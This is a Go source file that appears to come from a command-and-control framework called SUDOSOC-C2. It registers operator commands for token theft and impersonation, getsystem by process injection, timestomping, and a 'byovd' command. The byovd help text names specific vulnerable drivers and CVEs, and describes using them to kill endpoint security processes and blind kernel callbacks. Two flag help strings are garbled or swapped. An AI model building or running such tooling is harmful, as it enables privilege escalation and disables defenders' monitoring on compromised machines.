package privilege

import (
	"github.com/rsteube/carapace"
	"github.com/spf13/cobra"
	"github.com/spf13/pflag"

	"github.com/sudosoc/SUDOSOC-C2/client/command/filesystem"
	"github.com/sudosoc/SUDOSOC-C2/client/command/flags"
	"github.com/sudosoc/SUDOSOC-C2/client/command/help"
	"github.com/sudosoc/SUDOSOC-C2/client/console"
	consts "github.com/sudosoc/SUDOSOC-C2/client/constants"
)

// Commands returns the “ command and its subcommands.
func Commands(con *console.SudosocClient) []*cobra.Command {
	runAsCmd := &cobra.Command{
		Use:   consts.RunAsStr,
		Short: "Run a new process in the context of the designated user (Windows Only)",
		Long:  help.GetHelpFor([]string{consts.RunAsStr}),
		Run: func(cmd *cobra.Command, args []string) {
			RunAsCmd(cmd, con, args)
		},
		GroupID:     consts.PrivilegesHelpGroup,
		Annotations: flags.RestrictTargets(consts.WindowsCmdsFilter),
	}
	flags.Bind("", false, runAsCmd, func(f *pflag.FlagSet) {
		f.StringP("username", "u", "", "user to impersonate")
		f.StringP("process", "p", "", "process to start")
		f.StringP("args", "a", "", "arguments for the process")
		f.StringP("domain", "d", "", "domain of the user")
		f.StringP("password", "P", "", "password of the user")
		f.BoolP("show-window", "s", false, `
			Log on, but use the specified credentials on the network only. The new process uses the same token as the caller, but the system creates a new logon session within LSA, and the process uses the specified credentials as the default credentials.`)
		f.BoolP("net-only", "n", false, "use ")
		f.Int64P("timeout", "t", 30, "grpc timeout in seconds")
	})

	impersonateCmd := &cobra.Command{
		Use:   consts.ImpersonateStr,
		Short: "Impersonate a logged in user.",
		Long:  help.GetHelpFor([]string{consts.ImpersonateStr}),
		Args:  cobra.ExactArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			ImpersonateCmd(cmd, con, args)
		},
		GroupID:     consts.PrivilegesHelpGroup,
		Annotations: flags.RestrictTargets(consts.WindowsCmdsFilter),
	}
	flags.Bind("", false, impersonateCmd, func(f *pflag.FlagSet) {
		f.Int64P("timeout", "t", 30, "grpc timeout in seconds")
	})
	carapace.Gen(impersonateCmd).PositionalCompletion(carapace.ActionValues().Usage("name of the user account to impersonate"))

	revToSelfCmd := &cobra.Command{
		Use:   consts.RevToSelfStr,
		Short: "Revert to self: lose stolen Windows token",
		Long:  help.GetHelpFor([]string{consts.RevToSelfStr}),
		Run: func(cmd *cobra.Command, args []string) {
			RevToSelfCmd(cmd, con, args)
		},
		GroupID:     consts.PrivilegesHelpGroup,
		Annotations: flags.RestrictTargets(consts.WindowsCmdsFilter),
	}
	flags.Bind("", false, revToSelfCmd, func(f *pflag.FlagSet) {
		f.Int64P("timeout", "t", 30, "grpc timeout in seconds")
	})

	getSystemCmd := &cobra.Command{
		Use:   consts.GetSystemStr,
		Short: "Spawns a new sudosoc session as the NT AUTHORITY\\SYSTEM user (Windows Only)",
		Long:  help.GetHelpFor([]string{consts.GetSystemStr}),
		Run: func(cmd *cobra.Command, args []string) {
			GetSystemCmd(cmd, con, args)
		},
		GroupID:     consts.PrivilegesHelpGroup,
		Annotations: flags.RestrictTargets(consts.WindowsCmdsFilter, consts.SessionCmdsFilter),
	}
	flags.Bind("", false, getSystemCmd, func(f *pflag.FlagSet) {
		f.StringP("process", "p", "spoolsv.exe", "SYSTEM process to inject into")
		f.Int64P("timeout", "t", flags.DefaultTimeout, "grpc timeout in seconds")
	})

	makeTokenCmd := &cobra.Command{
		Use:         consts.MakeTokenStr,
		Short:       "Create a new Logon Session with the specified credentials",
		Long:        help.GetHelpFor([]string{consts.MakeTokenStr}),
		GroupID:     consts.PrivilegesHelpGroup,
		Annotations: flags.RestrictTargets(consts.WindowsCmdsFilter),
		Run: func(cmd *cobra.Command, args []string) {
			MakeTokenCmd(cmd, con, args)
		},
	}
	flags.Bind("", false, makeTokenCmd, func(f *pflag.FlagSet) {
		f.StringP("username", "u", "", "username of the user to impersonate")
		f.StringP("password", "p", "", "password of the user to impersonate")
		f.StringP("domain", "d", "", "domain of the user to impersonate")
		f.StringP("logon-type", "T", "LOGON_NEW_CREDENTIALS", "logon type to use")
		f.Int64P("timeout", "t", flags.DefaultTimeout, "grpc timeout in seconds")
	})

	chmodCmd := &cobra.Command{
		Use:   consts.ChmodStr,
		Short: "Change permissions on a file or directory",
		Long:  help.GetHelpFor([]string{consts.ChmodStr}),
		Args:  cobra.ExactArgs(2),
		Run: func(cmd *cobra.Command, args []string) {
			filesystem.ChmodCmd(cmd, con, args)
		},
		GroupID: consts.PrivilegesHelpGroup,
	}
	flags.Bind("", false, chmodCmd, func(f *pflag.FlagSet) {
		f.BoolP("recursive", "r", false, "recursively change permissions on files")
		f.Int64P("timeout", "t", flags.DefaultTimeout, "grpc timeout in seconds")
	})
	carapace.Gen(chmodCmd).PositionalCompletion(
		carapace.ActionValues().Usage("path to file to change mod perms"),
		carapace.ActionValues().Usage("file permissions in octal (eg. 0644)"),
	)

	chownCmd := &cobra.Command{
		Use:   consts.ChownStr,
		Short: "Change owner on a file or directory",
		Long:  help.GetHelpFor([]string{consts.ChownStr}),
		Args:  cobra.ExactArgs(3),
		Run: func(cmd *cobra.Command, args []string) {
			filesystem.ChownCmd(cmd, con, args)
		},
		GroupID: consts.PrivilegesHelpGroup,
	}
	flags.Bind("", false, chownCmd, func(f *pflag.FlagSet) {
		f.BoolP("recursive", "r", false, "recursively change permissions on files")
		f.Int64P("timeout", "t", flags.DefaultTimeout, "grpc timeout in seconds")
	})
	carapace.Gen(chownCmd).PositionalCompletion(
		carapace.ActionValues().Usage("path to file to change owner for"),
		carapace.ActionValues().Usage("user ID"),
		carapace.ActionValues().Usage("group ID (required)"),
	)

	chtimesCmd := &cobra.Command{
		Use:   consts.ChtimesStr,
		Short: "Change access and modification times on a file (timestomp)",
		Long:  help.GetHelpFor([]string{consts.ChtimesStr}),
		Args:  cobra.ExactArgs(3),
		Run: func(cmd *cobra.Command, args []string) {
			filesystem.ChtimesCmd(cmd, con, args)
		},
		GroupID: consts.PrivilegesHelpGroup,
	}
	flags.Bind("", false, chtimesCmd, func(f *pflag.FlagSet) {
		f.Int64P("timeout", "t", flags.DefaultTimeout, "grpc timeout in seconds")
		f.Bool("unix", false, "interpret timestamps as Unix seconds")
		f.Bool("unix-ms", false, "interpret timestamps as Unix milliseconds")
		f.Bool("rfc3339", false, "interpret timestamps as RFC3339")
		f.Bool("rfc1123", false, "interpret timestamps as RFC1123")
	})
	carapace.Gen(chtimesCmd).PositionalCompletion(
		carapace.ActionValues().Usage("path to file to change access timestamps"),
		carapace.ActionValues().Usage("last accessed time (default: 2006-01-02 15:04:05; see --help for format flags)"),
		carapace.ActionValues().Usage("last modified time (default: 2006-01-02 15:04:05; see --help for format flags)"),
	)

	getprivsCmd := &cobra.Command{
		Use:         consts.GetPrivsStr,
		Short:       "Get current privileges (Windows only)",
		Long:        help.GetHelpFor([]string{consts.GetPrivsStr}),
		GroupID:     consts.PrivilegesHelpGroup,
		Annotations: flags.RestrictTargets(consts.WindowsCmdsFilter),
		Run: func(cmd *cobra.Command, args []string) {
			GetPrivsCmd(cmd, con, args)
		},
	}
	flags.Bind("", false, getprivsCmd, func(f *pflag.FlagSet) {
		f.Int64P("timeout", "t", flags.DefaultTimeout, "grpc timeout in seconds")
	})

	// byovd — Bring Your Own Vulnerable Driver automation (Windows only)
	byovdCmd := &cobra.Command{
		Use:   consts.BYOVDStr,
		Short: "Load a vulnerable signed driver and use it to blind/kill EDRs from kernel space (Windows only)",
		Long: `byovd — Bring Your Own Vulnerable Driver

Load a known-vulnerable, legitimately-signed kernel driver to gain Ring-0
read/write access, then use that primitive to:

  list  — enumerate running EDR/AV processes (read-only, safe to try first)
  kill  — strip PPL from each EDR process and terminate it
  blind — zero PspCreateProcessNotifyRoutine entries for all third-party drivers
  full  — blind then kill (recommended)

SUPPORTED DRIVERS
  RTCore64  CVE-2019-16098  (MSI Afterburner ≤4.6.4)
  gdrv      CVE-2018-19320  (Gigabyte BIOS updater)
  DBUtil    CVE-2021-21551  (Dell firmware update)

WORKFLOW
  1. sudosoc> upload /path/to/RTCore64.sys C:\Windows\Temp\drv.sys
  2. sudosoc> byovd --driver-path C:\Windows\Temp\drv.sys --action full

  Or let byovd upload automatically:
     sudosoc> byovd --local-driver /path/to/RTCore64.sys --action full

REQUIREMENTS
  Administrator or SYSTEM on the target (SeLoadDriverPrivilege).`,
		GroupID:     consts.PrivilegesHelpGroup,
		Annotations: flags.RestrictTargets(consts.WindowsCmdsFilter),
		Run: func(cmd *cobra.Command, args []string) {
			BYOVDCmd(cmd, con, args)
		},
	}
	flags.Bind("", false, byovdCmd, func(f *pflag.FlagSet) {
		f.StringP("driver-path", "d", "", "remote path to the vulnerable driver (already on target)")
		f.StringP("local-driver", "l", "", "local path to the vulnerable driver (auto-uploaded)")
		f.StringP("driver-type", "T", "RTCore64", "driver type to use (RTCore64, gdrv, DBUtil)")
		f.StringP("action", "a", "list", "action: list | kill | blind | full")
		f.Int64P("timeout", "t", flags.DefaultTimeout, "grpc timeout in seconds")
	})
	carapace.Gen(byovdCmd).FlagCompletion(carapace.ActionMap{
		"action":      carapace.ActionValues("list", "kill", "blind", "full"),
		"driver-type": carapace.ActionValues("RTCore64", "gdrv", "DBUtil"),
	})

	byovdDriversCmd := &cobra.Command{
		Use:   consts.BYOVDDriversStr,
		Short: "List built-in vulnerable driver catalogue",
		Run: func(cmd *cobra.Command, args []string) {
			BYOVDListDriversCmd(cmd, con, args)
		},
	}
	byovdCmd.AddCommand(byovdDriversCmd)

	return []*cobra.Command{runAsCmd, impersonateCmd, revToSelfCmd, makeTokenCmd, getSystemCmd, chtimesCmd, chmodCmd, chownCmd, getprivsCmd, byovdCmd}
}
